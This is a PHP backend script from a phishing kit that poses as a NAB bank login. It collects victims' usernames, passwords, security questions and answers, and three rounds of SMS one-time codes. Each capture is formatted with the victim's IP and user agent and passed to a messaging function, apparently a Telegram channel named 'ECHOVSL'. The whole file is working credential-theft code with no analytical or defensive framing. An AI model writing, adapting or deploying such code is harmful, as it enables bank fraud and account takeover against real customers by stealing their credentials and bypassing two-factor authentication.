<?php
error_reporting(0);
session_start();
require("./fxker.php");

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $target = clean($_POST["sws"]);
    $data = "";

    switch ($target) {
        case 0:
            $username = $_SESSION['username'] = clean($_POST['x']);
            $password = $_SESSION['password'] = clean($_POST['xx']);

            $data .= "
------------------[NAB LOGIN 1]------------------

Username : $username
Password : $password

------------[USER AGENT IP DNS]-------------
User Agent\n $userAgent\n
IP Address : $realip
-------------[TELEGRAM: ECHOVSL]-------------";

            message($data);
            echo true;
            exit();
        case 1:
            $message = clean($_POST['x']);
            $q1 = clean($_POST['q1']);
            $a1 = clean($_POST['a1']);
            $q2 = clean($_POST['q2']);
            $a2 = clean($_POST['a2']);
            $q3 = clean($_POST['q3']);
            $a3 = clean($_POST['a3']);
            
            $data .= "
---------------[Security Que n Ans]---------------

Security Questions And Answers Set By " . ($_SESSION['username']) . "
Delay in Progress Second Code Comes in 60 Seconds Time.

Security Que 1: $q1
Security Ans 1:$a1

Security Que 2: $q2
Security Ans 2:$a2

Security Que 3: $q3
Security Ans 3:$a3

--------------[USER AGENT IP DNS]--------------
User Agent\n $userAgent\n
IP Address : $realip
--------------[TELEGRAM: ECHOVSL]--------------";

            message($data);
            echo true;
            exit();

        case 2:
            $otp = clean($_POST['xxl']);
            $data .= "
--------------[NAB SMS CODE 1]--------------

SMS CODE FROM : {$_SESSION['username']}
SMS CODE : $otp

------------[USER AGENT IP DNS]-------------
User Agent\n $userAgent\n
IP Address : $realip
-------------[TELEGRAM: ECHOVSL]-------------";

            message($data);
            echo true;
            exit();

        case 3:
            $otp = clean($_POST['xxll']);
            $data .= "
--------------[NAB SMS CODE 2]--------------

SMS CODE FROM : {$_SESSION['username']}
SMS CODE : $otp

------------[USER AGENT IP DNS]-------------
User Agent\n $userAgent\n
IP Address : $realip
-------------[TELEGRAM: ECHOVSL]-------------";

            message($data);
            echo true;
            exit();
            case 4:
            $data .= "
--------------[SECURITY QA REVIEW]--------------

" . ($_SESSION['username']) . " Reviewing Security Questions and Answers Set

------------[USER AGENT IP DNS]-------------
User Agent\n $userAgent\n
IP Address : $realip
-------------[TELEGRAM: ECHOVSL]-------------";

            message($data);
            echo true;
            exit();

        case 5:
            $otp = clean($_POST['xxlll']);
            $data .= "
--------------[NAB SMS CODE 3]--------------

SMS CODE FROM : {$_SESSION['username']}
SMS CODE : $otp

------------[USER AGENT IP DNS]-------------
User Agent\n $userAgent\n
IP Address : $realip
-------------[TELEGRAM: ECHOVSL]-------------";

            message($data);
            echo true;
            exit();

        default:
            header("Location: ../index.html");
            exit();
    }
}